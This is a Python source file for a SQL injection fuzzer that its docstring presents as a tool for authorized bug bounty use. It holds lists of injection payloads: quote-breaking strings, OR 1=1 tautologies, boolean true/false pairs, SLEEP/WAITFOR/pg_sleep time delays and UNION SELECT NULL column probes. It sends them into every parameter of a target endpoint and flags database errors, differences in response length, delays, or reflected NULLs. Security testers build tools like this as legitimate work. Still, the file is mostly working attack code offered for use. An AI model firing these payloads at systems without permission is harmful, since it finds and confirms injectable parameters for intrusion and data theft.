"""
sqli_fuzzer.py — SQL Injection fuzzer with four detection techniques.

Techniques (run in order per parameter, stops on first hit):
  1. Error-based
  2. Boolean-based blind
  3. Time-based blind
  4. UNION-based

Intended for authorized bug bounty use only.
"""

import re
import time
import copy
import requests
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
from typing import Optional


# ---------------------------------------------------------------------------
# Payload & signature definitions
# ---------------------------------------------------------------------------

ERROR_PAYLOADS: list[str] = [
    "'",
    '"',
    "';",
    '";',
    "\\",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1--",
    '" OR 1=1--',
    "' OR 1=1#",
    "1; SELECT SLEEP(0)--",
    "1 ORDER BY 1--",
    "1 ORDER BY 100--",
    "1' ORDER BY 1--",
    "1' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
]

# Regex patterns covering MySQL, Oracle, MSSQL, PostgreSQL, SQLite
ERROR_SIGNATURES: list[re.Pattern] = [
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"warning: mysql_", re.I),
    re.compile(r"unclosed quotation mark after the character string", re.I),
    re.compile(r"quoted string not properly terminated", re.I),
    re.compile(r"ora-\d{5}", re.I),                        # Oracle ORA-XXXXX
    re.compile(r"microsoft ole db provider for sql server", re.I),
    re.compile(r"odbc sql server driver", re.I),
    re.compile(r"syntax error.*in query expression", re.I),
    re.compile(r"pg_query\(\).*failed", re.I),
    re.compile(r"psql.*error", re.I),
    re.compile(r"sqlite_error", re.I),
    re.compile(r"sqlite3\.operationalerror", re.I),
    re.compile(r"division by zero", re.I),
    re.compile(r"supplied argument is not a valid mysql", re.I),
    re.compile(r"invalid column name", re.I),
    re.compile(r"column count doesn't match value count", re.I),
    re.compile(r"unexpected end of sql command", re.I),
]

BOOLEAN_PAIRS: list[tuple[str, str]] = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1--", "' AND 1=2--"),
    (" AND 1=1", " AND 1=2"),
]

TIME_PAYLOADS: list[tuple[str, int]] = [
    ("' OR SLEEP(5)--", 5),
    ("'; WAITFOR DELAY '0:0:5'--", 5),
    ("' OR pg_sleep(5)--", 5),
    ("1; SELECT SLEEP(5)--", 5),
    ("' AND SLEEP(5) AND '1'='1", 5),
]

BOOLEAN_LENGTH_TOLERANCE = 50   # true response must be within this of baseline
BOOLEAN_FALSE_DELTA = 100       # false response must differ by at least this much


class SQLiFuzzer:
    """Fuzz endpoints for SQL injection vulnerabilities."""

    def __init__(self, session: requests.Session, timeout: int = 15):
        self.session = session
        self.timeout = timeout
        self.findings: list[dict] = []

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def fuzz_endpoint(self, endpoint: dict) -> list[dict]:
        """
        Iterate over each parameter in *endpoint* and run all four detection
        techniques, stopping at the first confirmed hit per parameter.

        Returns a list of new finding dicts added during this call.
        """
        new_findings: list[dict] = []
        url = endpoint["url"]
        method = endpoint.get("method", "GET").upper()
        params = endpoint.get("params", {})

        for param_name in params:
            finding = self._test_parameter(url, method, params, param_name)
            if finding:
                self.findings.append(finding)
                new_findings.append(finding)

        return new_findings

    # ------------------------------------------------------------------
    # Per-parameter dispatcher
    # ------------------------------------------------------------------

    def _test_parameter(
        self, url: str, method: str, params: dict, param_name: str
    ) -> Optional[dict]:
        """Run techniques in order; return first finding or None."""
        for technique in (
            self._test_error_based,
            self._test_boolean_based,
            self._test_time_based,
            self._test_union_based,
        ):
            result = technique(url, method, params, param_name)
            if result:
                return result
        return None

    # ------------------------------------------------------------------
    # Technique 1 — Error-based
    # ------------------------------------------------------------------

    def _test_error_based(
        self, url: str, method: str, params: dict, param_name: str
    ) -> Optional[dict]:
        for payload in ERROR_PAYLOADS:
            injected = self._inject(params, param_name, payload)
            try:
                response = self._send(url, method, injected)
            except requests.RequestException:
                continue

            body = response.text
            for sig in ERROR_SIGNATURES:
                match = sig.search(body)
                if match:
                    return self._make_finding(
                        finding_type="Error-Based SQL Injection",
                        url=url,
                        param=param_name,
                        payload=payload,
                        evidence=f"DB error signature matched: '{match.group(0)[:120]}'",
                        severity="HIGH",
                    )
        return None

    # ------------------------------------------------------------------
    # Technique 2 — Boolean-based blind
    # ------------------------------------------------------------------

    def _test_boolean_based(
        self, url: str, method: str, params: dict, param_name: str
    ) -> Optional[dict]:
        # Baseline
        try:
            baseline_resp = self._send(url, method, params)
            baseline_len = len(baseline_resp.text)
        except requests.RequestException:
            return None

        for true_payload, false_payload in BOOLEAN_PAIRS:
            try:
                true_injected = self._inject(params, param_name, params[param_name] + true_payload)
                false_injected = self._inject(params, param_name, params[param_name] + false_payload)

                true_resp = self._send(url, method, true_injected)
                false_resp = self._send(url, method, false_injected)
            except requests.RequestException:
                continue

            true_len = len(true_resp.text)
            false_len = len(false_resp.text)

            true_delta = abs(true_len - baseline_len)
            false_delta = abs(false_len - baseline_len)

            if true_delta <= BOOLEAN_LENGTH_TOLERANCE and false_delta > BOOLEAN_FALSE_DELTA:
                return self._make_finding(
                    finding_type="Boolean-Based Blind SQL Injection",
                    url=url,
                    param=param_name,
                    payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                    evidence=(
                        f"Baseline len={baseline_len}, TRUE len={true_len} "
                        f"(Δ{true_delta}), FALSE len={false_len} (Δ{false_delta})"
                    ),
                    severity="HIGH",
                )
        return None

    # ------------------------------------------------------------------
    # Technique 3 — Time-based blind
    # ------------------------------------------------------------------

    def _test_time_based(
        self, url: str, method: str, params: dict, param_name: str
    ) -> Optional[dict]:
        # Measure baseline duration
        try:
            t0 = time.monotonic()
            self._send(url, method, params)
            baseline_duration = time.monotonic() - t0
        except requests.RequestException:
            return None

        for payload, expected_delay in TIME_PAYLOADS:
            injected = self._inject(params, param_name, params[param_name] + payload)
            try:
                t0 = time.monotonic()
                self._send(url, method, injected, timeout=expected_delay + 10)
                elapsed = time.monotonic() - t0
            except requests.Timeout:
                # A timeout itself is evidence of a time-delay injection
                elapsed = expected_delay + 10
            except requests.RequestException:
                continue

            threshold = baseline_duration + expected_delay - 1
            if elapsed >= threshold:
                return self._make_finding(
                    finding_type="Time-Based Blind SQL Injection",
                    url=url,
                    param=param_name,
                    payload=payload,
                    evidence=(
                        f"Elapsed {elapsed:.2f}s >= threshold {threshold:.2f}s "
                        f"(baseline {baseline_duration:.2f}s + delay {expected_delay}s - 1s)"
                    ),
                    severity="CRITICAL",
                )
        return None

    # ------------------------------------------------------------------
    # Technique 4 — UNION-based
    # ------------------------------------------------------------------

    def _test_union_based(
        self, url: str, method: str, params: dict, param_name: str
    ) -> Optional[dict]:
        base_value = params.get(param_name, "1")

        for col_count in range(1, 11):
            nulls = ",".join(["NULL"] * col_count)
            payload = f"' UNION SELECT {nulls}--"
            injected = self._inject(params, param_name, base_value + payload)

            try:
                response = self._send(url, method, injected)
            except requests.RequestException:
                continue

            body = response.text

            # Must not contain error signatures
            has_error = any(sig.search(body) for sig in ERROR_SIGNATURES)
            if has_error:
                continue

            # Response should contain 'null' (case-insensitive rendered value)
            if "null" in body.lower():
                return self._make_finding(
                    finding_type="UNION-Based SQL Injection",
                    url=url,
                    param=param_name,
                    payload=payload,
                    evidence=f"UNION SELECT with {col_count} NULL column(s) reflected in response",
                    severity="CRITICAL",
                )
        return None

    # ------------------------------------------------------------------
    # Shared helpers
    # ------------------------------------------------------------------

    def _inject(self, params: dict, param_name: str, value: str) -> dict:
        """Return a *copy* of params with param_name set to value."""
        injected = copy.copy(params)
        injected[param_name] = value
        return injected

    def _send(
        self,
        url: str,
        method: str,
        params: dict,
        timeout: Optional[int] = None,
    ) -> requests.Response:
        """Send a request using the stored session."""
        _timeout = timeout if timeout is not None else self.timeout
        if method == "GET":
            return self.session.get(url, params=params, timeout=_timeout)
        else:
            return self.session.post(url, data=params, timeout=_timeout)

    @staticmethod
    def _make_finding(
        finding_type: str,
        url: str,
        param: str,
        payload: str,
        evidence: str,
        severity: str,
    ) -> dict:
        return {
            "type": finding_type,
            "url": url,
            "param": param,
            "payload": payload,
            "evidence": evidence,
            "severity": severity,
        }
